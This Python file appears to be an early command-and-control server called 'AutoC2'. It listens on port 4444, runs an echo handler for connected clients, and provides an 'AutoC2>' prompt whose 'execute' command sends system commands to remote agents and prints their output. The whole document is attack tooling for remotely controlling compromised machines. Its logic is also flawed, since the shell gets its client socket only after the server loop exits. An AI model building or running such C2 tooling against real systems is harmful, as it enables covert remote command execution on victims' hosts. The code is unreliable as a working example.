import socket
import threading
import readline

# Set server IP and port
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

# Function to handle client connections
def handle_client(client_socket, client_address):
    print(f"[+] New connection from {client_address}")
    try:
        while True:
            # Receive data from the client
            data = client_socket.recv(1024)
            if not data:
                break  # Exit if client closes the connection
            print(f"Received from {client_address}: {data.decode()}")
            
            # Echo the data back to the client
            client_socket.sendall(data)
    except Exception as e:
        print(f"[!] Error with client {client_address}: {e}")
    finally:
        print(f"[-] Connection closed for {client_address}")
        client_socket.close()

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen()
    print(f"Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    try:
        while True:
            # Accept a new client
            client_socket, client_address = server_socket.accept()
            print(f"[+] Accepted connection from {client_address}")
            
            # Create a new thread to handle the client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down the server.")
    finally:
        server_socket.close()

    return server_socket, client_socket

def stop_server(server_socket, client_socket):
    server_socket.close()
    client_socket.close()

def AutoC2_shell(server_socket, client_socket):
    # Custom commands to interact with agents
    while True:
        command = input("AutoC2>")
        command = command.split()
        
        # Blank command
        if len(command) == 0:
            continue
        
        # `execute` = Execute system command
        if command[0].lower() == "execute":
            # Craft system command to send
            cmd = " ".join(command[1:]) + "\n"

            # Send command
            client_socket.send(cmd.encode())

            # Receive output from the client
            buffer = b''
            while b'ac2delim' not in buffer:
                buffer += client_socket.recv(4096)
            output = buffer.partition(b'ac2delim')[0].decode()
            print(output)

def main():
    # Start server
    server_socket, client_socket = start_server()
    
    # Allow interaction via custom shell
    AutoC2_shell(server_socket, client_socket)

    # Stop server
    stop_server(server_socket, client_socket)

if __name__=="__main__":
    main()
